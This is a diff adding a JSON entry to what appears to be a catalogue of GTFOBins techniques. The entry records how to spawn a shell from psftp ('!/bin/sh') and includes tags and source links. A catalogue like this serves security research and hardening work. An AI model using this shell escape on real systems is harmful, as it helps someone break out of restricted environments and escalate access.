@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-psftp-shell",
+  "name": "GTFOBins · psftp (shell)",
+  "command": "psftp\n!/bin/sh",
+  "description": "Use psftp to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "psftp",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/psftp/#shell",
+  "upstream_id": "psftp/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/psftp/"
+    }
+  ]
+}
